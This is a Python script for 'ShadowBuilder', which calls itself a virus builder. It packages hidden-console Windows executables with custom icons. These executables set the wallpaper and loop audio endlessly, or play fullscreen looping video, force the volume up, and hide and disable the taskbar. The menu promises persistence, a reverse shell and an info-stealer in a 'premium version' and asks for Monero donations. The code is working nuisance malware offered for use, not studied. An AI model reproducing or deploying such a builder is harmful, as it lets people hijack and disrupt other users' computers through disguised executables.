# Note i know a little python so dont judge me lol. I did use AI for some problems and tips.

import os
import subprocess
import sys
import time
from pathlib import Path
from colorama import Fore, Style, init

init(autoreset=True)


ROOT = Path(__file__).parent.resolve()
MUSIC_DIR = ROOT / "music"
VIDEO_DIR = ROOT / "video"

DEFAULT_WAV = MUSIC_DIR / "default.wav"
DEFAULT_MP3_PNG = MUSIC_DIR / "default.png"
DEFAULT_MP3_ICO = MUSIC_DIR / "default.ico"

DEFAULT_MP4 = VIDEO_DIR / "default1.mp4"
DEFAULT_VIDEO_PNG = VIDEO_DIR / "default1.png"
DEFAULT_VIDEO_ICO = VIDEO_DIR / "default1.ico"


BANNER = f"""{Fore.CYAN}
╔════════════════════════════════════════════════╗
║                 ShadowBuilder                  ║  
║            Virus Builder by zero0.day          ║ 
║                                                ║
╚════════════════════════════════════════════════╝
{Style.RESET_ALL}"""

MENU = f"""{Fore.MAGENTA}
1) Build Audio EXE 
2) Build Video EXE 
3) More and Suport me
4) Credits
5) Exit
{Style.RESET_ALL}"""


def ensure_exists(path: Path, name: str):
    if not Path(path).exists():
        print(Fore.YELLOW + f"[warn] {name} not found: {path}")
        return False
    return True

def run(cmd, **kwargs):
    print(Fore.CYAN + "Running:", " ".join(cmd))
    subprocess.run(cmd, check=True, **kwargs)

def pyinstaller_available():
    try:
        subprocess.run(["pyinstaller", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception:
        return False


def build_exe(script_name: str, exe_name: str, ico_file: str, add_data: list):
    """
    Build onefile noconsole exe using PyInstaller.
    add_data is list of file paths to bundle.
    Fully resilient: cleansup on success or failure.
    """
    if not pyinstaller_available():
        print(Fore.RED + "PyInstaller not found. Install: python -m pip install pyinstaller")
        return False

    cmd = ["pyinstaller", "--onefile", "--noconsole", f"--icon={ico_file}", f"--name={exe_name}"]
    for d in add_data:
        src = str(Path(d).resolve())
        cmd.append(f"--add-data={src};.")
    cmd.append(script_name)

    success = False
    try:
        run(cmd)
        dist_path = ROOT / "dist" / f"{exe_name}.exe"
        if dist_path.exists():
            final_path = ROOT / f"{exe_name}.exe"
            dist_path.replace(final_path)
            print(Fore.GREEN + f"Built: {final_path}")
            success = True
        else:
            print(Fore.RED + "Build succeeded but EXE not found in dist/.")
    except subprocess.CalledProcessError as e:
        print(Fore.RED + "PyInstaller failed:", e)

  
    for tmp in ["build", "__pycache__", f"{script_name[:-3]}.spec"]:
        p = ROOT / tmp
        if p.exists():
            try:
                if p.is_dir():
                    import shutil
                    shutil.rmtree(p)
                else:
                    p.unlink()
            except Exception as e:
                print(Fore.YELLOW + f"[warn] Could not remove {p}: {e}")

    return success


def make_music_worker(wav_path: str, png_path: str):
    """
    Returns string content for music worker script using winsound and wallpaper set.
    Uses raw strings for paths.
    """
    wav_r = str(Path(wav_path).resolve()).replace("\\", "/")
    png_r = str(Path(png_path).resolve()).replace("\\", "/")
    code = f'''# audio_auto.py (generated)

import winsound, ctypes, time
# set wallpaper (best-effort)
try:
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"{png_r}", 3)
except Exception:
    pass
# play wav in infinite loop (SND_LOOP | SND_ASYNC)
try:
    winsound.PlaySound(r"{wav_r}", winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
except Exception:
    pass
# keep process alive
while True:
    time.sleep(60)
'''
    return code 

def make_video_worker(mp4_path: str, png_path: str, loop: bool, raise_volume: bool, lock_taskbar: bool):
    mp4_r = str(Path(mp4_path).resolve()).replace("\\", "/")
    png_r = str(Path(png_path).resolve()).replace("\\", "/")

    code = f'''

import time, ctypes


try:
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"{png_r}", 3)
except Exception:
    pass


SW_HIDE = 0
LOCK_TASKBAR = {lock_taskbar}

if LOCK_TASKBAR:
    try:
        taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
        ctypes.windll.user32.ShowWindow(taskbar, SW_HIDE)   
        ctypes.windll.user32.EnableWindow(taskbar, False)   
    except Exception:
        pass


RAISE_VOLUME = {raise_volume}
if RAISE_VOLUME:
    try:
        from ctypes import POINTER, cast
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        current = volume.GetMasterVolumeLevelScalar()
        if current < 0.3:
            volume.SetMasterVolumeLevelScalar(1.0, None)
    except Exception:
        pass

 
LOOP_VIDEO = {loop}

try:
    import vlc
    player = vlc.MediaPlayer(r"{mp4_r}")
    player.set_fullscreen(True)
    player.play()

    while True:
        time.sleep(1)
        playing = player.is_playing()
        if not playing:
            if LOOP_VIDEO:
                player.stop()
                player.play()
            else:
                break

except Exception:
    try:
        import os
        os.system(f'start /max "" "{mp4_r}"')
    except Exception:
        pass
'''
    return code


def action_build_music():
    print(Fore.CYAN + "\nBuild audio exe (enter for default).")
    wav = input(Fore.YELLOW + f"WAV file path (Enter for default: {DEFAULT_WAV}): ").strip() or str(DEFAULT_WAV)
    png = input(Fore.YELLOW + f"Wallpaper PNG (Enter for default: {DEFAULT_MP3_PNG}): ").strip() or str(DEFAULT_MP3_PNG)
    ico = input(Fore.YELLOW + f"Icon ICO (Enter for default: {DEFAULT_MP3_ICO}): ").strip() or str(DEFAULT_MP3_ICO)
    exe_name = input(Fore.YELLOW + "Output EXE name (no extension, default 'audio'): ").strip() or "audio"

    ok = True
    ok &= ensure_exists(Path(wav), "WAV")
    ok &= ensure_exists(Path(png), "Wallpaper PNG")
    ok &= ensure_exists(Path(ico), "Icon ICO")
    if not ok:
        print(Fore.RED + "One or more files missing. Fix and retry.")
        return

    worker_code = make_music_worker(wav, png)
    worker_file = ROOT / "music_auto.py"
    worker_file.write_text(worker_code, encoding="utf-8")

    success = build_exe(str(worker_file.name), exe_name, str(Path(ico).resolve()), add_data=[wav, png])
    try:
        worker_file.unlink()
    except Exception:
        pass
    if success:
        print(Fore.GREEN + "Audio EXE ready — run it on any Windows PC.")

def action_build_video():
    print(Fore.CYAN + "\nBuild Video EXE (MP4 fullscreen) — defaults if Enter.")
    mp4 = input(Fore.YELLOW + f"MP4 file path (Enter for default: {DEFAULT_MP4}): ").strip() or str(DEFAULT_MP4)
    png = input(Fore.YELLOW + f"Wallpaper PNG (Enter for default: {DEFAULT_VIDEO_PNG}): ").strip() or str(DEFAULT_VIDEO_PNG)
    ico = input(Fore.YELLOW + f"Icon ICO (Enter for default: {DEFAULT_VIDEO_ICO}): ").strip() or str(DEFAULT_VIDEO_ICO)
    exe_name = input(Fore.YELLOW + "Output EXE name (no extension, default 'video'): ").strip() or "video"
    loop_q = input(Fore.YELLOW + "Loop video? (y/N): ").strip().lower() == "y"
    raise_q = input(Fore.YELLOW + "Raise volume if low/muted? (y/N): ").strip().lower() == "y"
    lock_q = input(Fore.YELLOW + "Hide & lock taskbar? (y/N): ").strip().lower() == "y"

    ok = True
    ok &= ensure_exists(Path(mp4), "MP4")
    ok &= ensure_exists(Path(png), "Wallpaper PNG")
    ok &= ensure_exists(Path(ico), "Icon ICO")
    if not ok:
        print(Fore.RED + "One or more files missing. Fix and retry.")
        return

    worker_code = make_video_worker(mp4, png, loop_q, raise_q, lock_q)
    worker_file = ROOT / "video_auto.py"
    worker_file.write_text(worker_code, encoding="utf-8")

    add_data = [mp4, png]
    success = build_exe(str(worker_file.name), exe_name, str(Path(ico).resolve()), add_data=add_data)
    try:
        worker_file.unlink()
    except Exception:
        pass
    if success:
        print(Fore.GREEN + "Video EXE ready — run it on any Windows PC.")

def action_prereqs():
    print(Fore.CYAN + "\nWill add Persistence,ReversShell,InfoStealer (hopefully) \n")
    print(Fore.CYAN + "Persistence,ReversShell,InfoStealer will be added in the premium version (hopefully) \n")
    print(Fore.CYAN + "Support me at XMR: 88fGveAuw7DdMumere62oMhXGWqt56NMq9GfMStB9eP8fWcXFKVNPXuiQTHJdtRTqvExLhX5Xqw14MJM4pQmD1x2SApNp3g \n")
    print("\n ")
    print(" \n ")

def action_credits():
    print(Fore.GREEN + "\nShadowBuilder made by (zero0.day). Use responsibly.\n")

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    while True:
        print(MENU)
        choice = input(Fore.YELLOW + "Select option (1-5): ").strip()
        if choice == "1":
            action_build_music()
        elif choice == "2":
            action_build_video()
        elif choice == "3":
            action_prereqs()
        elif choice == "4":
            action_credits()
        elif choice == "5":
            print(Fore.CYAN + "Bye!")
            break
        else:
            print(Fore.RED + "Invalid choice. Try again.")

if __name__ == "__main__":
    main()
